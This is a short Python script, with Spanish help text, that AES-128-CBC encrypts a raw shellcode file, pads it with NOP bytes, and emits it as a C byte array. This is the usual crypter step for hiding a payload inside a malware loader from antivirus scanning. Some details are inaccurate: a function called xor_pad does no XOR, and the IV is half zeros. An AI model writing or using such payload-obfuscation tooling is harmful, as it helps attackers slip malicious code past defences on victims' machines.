# shellcode.py
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import argparse
import textwrap

def xor_pad(data, block_size=16):
    pad_len = block_size - (len(data) % block_size)
    return data + b"\x90" * pad_len  # NOP-padding

def encrypt_shellcode(shellcode_bytes, key_bytes):
    iv = get_random_bytes(8)  # Custom IV length for this structure
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv + b"\x00" * 8)  # Extend IV to 16 bytes
    padded = xor_pad(shellcode_bytes)
    encrypted = cipher.encrypt(padded)
    return iv, encrypted

def to_c_array(name, data):
    hexed = ', '.join(f'0x{b:02x}' for b in data)
    wrapped = textwrap.fill(hexed, 80)
    return f"unsigned char {name}[] = {{\n{wrapped}\n}};"

def main():
    parser = argparse.ArgumentParser(description="Cifra shellcode con AES-128-CBC y genera array C")
    parser.add_argument("-i", "--input", required=True, help="Archivo binario del shellcode")
    parser.add_argument("-k", "--key", required=True, help="Clave AES de 16 bytes (ej: 'Key123-FINAL1-X!')")
    args = parser.parse_args()

    with open(args.input, "rb") as f:
        shellcode = f.read()

    key = args.key.encode("utf-8")
    if len(key) != 16:
        raise ValueError("La clave AES debe ser de exactamente 16 bytes")

    iv, encrypted = encrypt_shellcode(shellcode, key)
    final = iv + encrypted

    print(to_c_array("encrypted_shellcode", final))

if __name__ == "__main__":
    main()
